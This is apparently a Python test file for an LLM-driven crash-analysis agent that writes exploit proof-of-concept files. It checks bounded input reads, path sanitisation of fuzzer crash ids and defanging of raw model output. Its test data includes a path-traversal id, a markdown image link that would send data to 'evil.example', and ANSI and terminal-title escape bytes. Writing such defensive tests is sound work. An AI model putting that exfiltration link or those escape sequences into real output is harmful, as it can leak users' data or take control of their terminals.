"""Crash-agent artifact + prompt-bundle robustness.

* Prompt bundles read the crash input BOUNDED (only the bytes the
  prompt keeps) and degrade a missing/unreadable input file into a
  graceful ``crash-input-read-error`` block — an unguarded read or
  ``stat()`` would abort analysis of every remaining crash in the
  per-crash loop.
* ``exploit_artifact_path`` is the single source of truth for the
  exploit PoC filename, and the writer uses it — consumers deriving
  the path from the raw crash id (AFL ids contain ``:`` and ``,``)
  read a name that was never written.
"""

from __future__ import annotations

import sys
from pathlib import Path
from types import SimpleNamespace

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))

from packages.binary_analysis.crash_analyser import CrashContext  # noqa: E402
from packages.llm_analysis.cc_dispatch import _safe_id  # noqa: E402
from packages.llm_analysis.crash_agent import (  # noqa: E402
    CrashAnalysisAgent,
    _build_crash_analysis_bundle,
    _build_crash_exploit_bundle,
    exploit_artifact_path,
    refined_exploit_artifact_path,
)

AFL_ID = "id:000000,sig:11,src:000001,op:havoc,rep:2"


def _ctx(input_file: Path, crash_id: str = AFL_ID) -> CrashContext:
    return CrashContext(
        crash_id=crash_id,
        binary_path=Path("/bin/true"),
        input_file=input_file,
        signal="11",
        crash_type="stack_overflow",
        exploitability="exploitable",
    )


def _bundle_text(bundle) -> str:
    return "\n".join(m.content for m in bundle.messages)


class TestAnalysisBundleInputHandling:

    def test_missing_input_file_degrades_to_error_block(self, tmp_path):
        ctx = _ctx(tmp_path / "gone" / "crash-input")
        bundle = _build_crash_analysis_bundle(
            ctx, lambda s: str(s), lambda r: "regs",
        )
        text = _bundle_text(bundle)
        assert "Error reading input file" in text
        assert "unknown" in text  # input_size slot degraded, not raised

    def test_large_input_only_first_512_bytes_rendered(self, tmp_path):
        f = tmp_path / "crash-input"
        f.write_bytes(b"A" * 512 + b"MARKER-BEYOND-CAP" + b"B" * 4096)
        ctx = _ctx(f)
        bundle = _build_crash_analysis_bundle(
            ctx, lambda s: str(s), lambda r: "regs",
        )
        text = _bundle_text(bundle)
        assert "MARKER-BEYOND-CAP" not in text
        # hex dump of the capped prefix is present ('A' == 0x41;
        # bytes.hex(' ', 16) groups 16 bytes between separators)
        assert "41414141" in text


class TestExploitBundleInputHandling:

    def test_missing_input_file_does_not_raise(self, tmp_path):
        ctx = _ctx(tmp_path / "gone" / "crash-input")
        bundle = _build_crash_exploit_bundle(ctx)
        text = _bundle_text(bundle)
        assert "Error reading input file" in text
        assert "unknown" in text

    def test_present_input_file_size_rendered(self, tmp_path):
        f = tmp_path / "crash-input"
        f.write_bytes(b"XYZ")
        bundle = _build_crash_exploit_bundle(_ctx(f))
        assert "3" in _bundle_text(bundle)


class TestExploitArtifactPath:

    def test_sanitises_afl_id_and_uses_cpp_extension(self, tmp_path):
        p = exploit_artifact_path(tmp_path, AFL_ID)
        assert p.parent == tmp_path / "exploits"
        assert p.name == f"{_safe_id(AFL_ID)}_exploit.cpp"
        assert ":" not in p.name

    def test_refined_paths_sanitise_afl_id_both_suffixes(self, tmp_path):
        validated = refined_exploit_artifact_path(tmp_path, AFL_ID, validated=True)
        best = refined_exploit_artifact_path(tmp_path, AFL_ID, validated=False)
        assert validated.parent == tmp_path / "exploits"
        assert best.parent == tmp_path / "exploits"
        assert validated.name == f"{_safe_id(AFL_ID)}_exploit_validated.c"
        assert best.name == f"{_safe_id(AFL_ID)}_exploit_best_attempt.c"
        for p in (validated, best):
            assert ":" not in p.name
            assert "," not in p.name

    def test_refined_path_contains_hostile_id(self, tmp_path):
        # A crash id derived from a hostile filename stem must not
        # escape the exploits/ directory or smuggle separators.
        hostile = "id:0,../..//etc,op:havoc"
        p = refined_exploit_artifact_path(tmp_path, hostile, validated=True)
        assert p.parent == tmp_path / "exploits"
        assert "/" not in p.name and ".." not in p.name

    def test_writer_uses_canonical_path(self, tmp_path, monkeypatch):
        f = tmp_path / "crash-input"
        f.write_bytes(b"AAAA")
        ctx = _ctx(f)

        class _FakeLLM:
            def generate_structured(self, **kwargs):
                return (
                    {"code": "int main(){return 0;}", "reasoning": "r"},
                    "raw response",
                )

        agent = SimpleNamespace(
            out_dir=tmp_path / "out",
            llm=_FakeLLM(),
            llm_config=None,
            verify_exploits=False,
            judge_intent=False,
            record_witnesses=False,
            execute_exploits=False,
        )
        agent.generate_exploit = CrashAnalysisAgent.generate_exploit.__get__(
            agent, type(agent),
        )

        assert agent.generate_exploit(ctx) is True
        expected = exploit_artifact_path(agent.out_dir, ctx.crash_id)
        assert expected.exists()
        assert expected.read_text() == "int main(){return 0;}"


class TestExploitResponseArtifactSanitised:
    def test_raw_llm_response_is_defanged_on_disk(self, tmp_path):
        """The _exploit_response.txt sidecar carries raw LLM reasoning
        and the full response — the same targeted treatment as the
        agent.py patch artifact applies (autofetch markup stripped,
        control/ANSI bytes escaped) so a `cat` of the artifact cannot
        drive the terminal and a later re-ingest cannot autofetch."""
        f = tmp_path / "crash-input"
        f.write_bytes(b"AAAA")
        ctx = _ctx(f)

        hostile_reasoning = (
            "see ![exfil](https://evil.example/leak?d=1) now "
            "\x1b[31mred\x1b[0m"
        )

        class _FakeLLM:
            def generate_structured(self, **kwargs):
                return (
                    {"code": "int main(){return 0;}",
                     "reasoning": hostile_reasoning},
                    "full response with \x1b]0;title\x07 escape",
                )

        agent = SimpleNamespace(
            out_dir=tmp_path / "out",
            llm=_FakeLLM(),
            llm_config=None,
            verify_exploits=False,
            judge_intent=False,
            record_witnesses=False,
            execute_exploits=False,
        )
        agent.generate_exploit = CrashAnalysisAgent.generate_exploit.__get__(
            agent, type(agent),
        )
        assert agent.generate_exploit(ctx) is True

        response_file = agent.out_dir / "exploits" / (
            f"{_safe_id(ctx.crash_id)}_exploit_response.txt"
        )
        text = response_file.read_text(encoding="utf-8")
        assert "\x1b" not in text and "\x07" not in text
        assert "evil.example" not in text
        # Content survives, just defanged.
        assert "REASONING:" in text and "FULL LLM RESPONSE:" in text
